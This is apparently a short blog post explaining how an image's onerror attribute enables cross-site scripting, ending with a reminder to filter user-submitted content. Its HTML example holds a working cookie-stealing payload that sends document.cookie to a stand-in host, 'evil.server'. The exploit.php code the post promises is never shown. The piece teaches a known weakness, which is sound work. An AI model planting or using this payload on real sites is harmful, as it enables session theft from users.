---
layout: post
title: XSS with Img OnError attribute
tags:
- javascript
- PHP
- security
---

So much of my time is spent worrying over the src or href tags on images and links - that I sometimes forget about the other attributes.

Imagine being able to make an image which has no black-flagged content in the src but yet can still make a remote request, logging the user's cookie information?  Thats right - this can be done - using the 'onerror' attribute of an image.

What you need to do is to create an image link that is obviously broken or empty.  Then, javascript handles such events by throwing an error for that element.  Add an item to the onerror attribute to request a remote URL as your images src - which you add on document.cookie.  The remote script logs all requests, and then displays an image.

Check out the code below:

Source page without proper filtering:

```html
<html>
    <body>
        <h1>test</h1>
        <h2>asdf</h2>
        <img onerror="this.src='http://evil.server/exploit.php?'+document.cookie" src=""></img>
    </body>
</html>
```

Then, on evil.server, place your image.  Finally, top it off with the following code in exploit.php

Easy as that.  Just another reminder to properly filter your use submitted content.
